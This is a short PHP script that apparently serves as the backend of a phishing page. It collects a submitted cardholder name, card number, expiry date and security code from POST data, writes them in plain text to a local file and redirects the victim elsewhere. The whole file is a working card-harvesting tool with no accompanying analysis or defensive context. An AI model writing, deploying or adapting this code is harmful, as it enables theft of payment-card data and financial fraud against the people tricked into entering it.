<?php
$file = "usernames.txt";
$handle = fopen($file, "a");
fwrite($handle, "owner: " . $_POST['owner'] . "\n");
fwrite($handle, "cardNumber: " . $_POST['cardNumber'] . "\n");
fwrite($handle, "expirationdate: " . $_POST['expirationdate'] . "\n");
fwrite($handle, "securitycode: " . $_POST['securitycode'] . "\n");
fclose($handle);
header('Location: <REDIRECT_URL>');
exit;
?>
